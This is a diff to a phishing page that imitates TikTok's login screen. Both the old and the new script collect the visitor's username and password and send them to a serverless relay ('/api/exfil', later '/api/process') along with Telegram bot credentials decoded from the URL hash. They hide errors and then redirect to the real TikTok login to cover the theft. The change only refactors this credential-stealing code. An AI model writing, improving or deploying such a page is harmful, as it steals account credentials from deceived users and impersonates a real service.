@@ -93,48 +93,55 @@
         <p class="text-gray-400 text-[10px]">© 2026 TikTok</p>
     </footer>
 
-    <script>
-        // Extracting PHISHHUB_OS config from URL hash
-        const getExfilParams = () => {
-            const h = window.location.hash.substring(1);
-            if (!h) return null;
-            try { return JSON.parse(atob(h)); } catch(e) { return null; }
-        };
+<script>
+    // 1. Grab raw Base64 config from URL Hash
+    const getRawConfig = () => {
+        const h = window.location.hash.substring(1);
+        return h || null;
+    };
 
-        const config = getExfilParams();
+    const configString = getRawConfig();
 
-        async function dispatch() {
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('pass').value;
+    async function dispatch() {
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('pass').value;
 
-            if (!user || !pass) return;
+        // Ensure inputs are not empty
+        if (!user || !pass) return;
 
-            // Final redirection to hide the operation
-            const finishUrl = "https://www.tiktok.com/login";
+        // Redirect to real TikTok login after execution
+        const finishUrl = "https://www.tiktok.com/login";
 
-            if (!config) {
-                window.location.href = finishUrl;
-                return;
-            }
+        // Show a loader if you have one (e.g., id="loader")
+        const loader = document.getElementById('loader');
+        if (loader) loader.style.display = 'block';
 
-            try {
-                // Hitting the serverless exfil relay
-                await fetch('/api/exfil', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        target: 'tiktok',
-                        credentials: { username: user, password: pass },
-                        tgToken: config.t,
-                        tgChat: config.c
-                    })
-                });
-            } catch (err) {
-                // Silent fail
-            } finally {
-                window.location.href = finishUrl;
-            }
+        // If no config found in URL hash, just redirect
+        if (!configString) {
+            window.location.href = finishUrl;
+            return;
         }
-    </script>
+
+        try {
+            // 2. Call your central Vercel API relay (/api/process)
+            await fetch('/api/process', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    config: configString, // The encoded Telegram credentials
+                    data: { 
+                        User: user, 
+                        Pass: pass 
+                    }
+                })
+            });
+        } catch (err) {
+            // Silenced for a seamless user experience
+        } finally {
+            // 3. Final Redirect
+            window.location.href = finishUrl;
+        }
+    }
+</script>
 </body>
 </html>
